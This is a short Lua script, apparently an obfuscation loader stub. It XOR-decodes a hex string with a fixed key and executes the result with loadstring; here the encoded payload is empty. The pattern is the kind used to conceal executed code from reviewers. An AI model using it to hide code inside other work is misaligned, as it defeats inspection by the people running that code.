local k={133,50,178,99,177,232,1,171,131,213,216,122,43,3,52,205,204,19,107,249,194,213,7,231,156,253,103,246,114,190,71,125}
local s=[[]]
local t={}
local n=0
for i=1,#s,2 do
	n=n+1
	local v=tonumber(s:sub(i,i+1),16)
	t[n]=string.char(bit32.bxor(v,k[((n-1)%#k)+1]))
end
local c=loadstring or load
local fn,err=c(table.concat(t))
if not fn then error(tostring(err),0) end
fn()
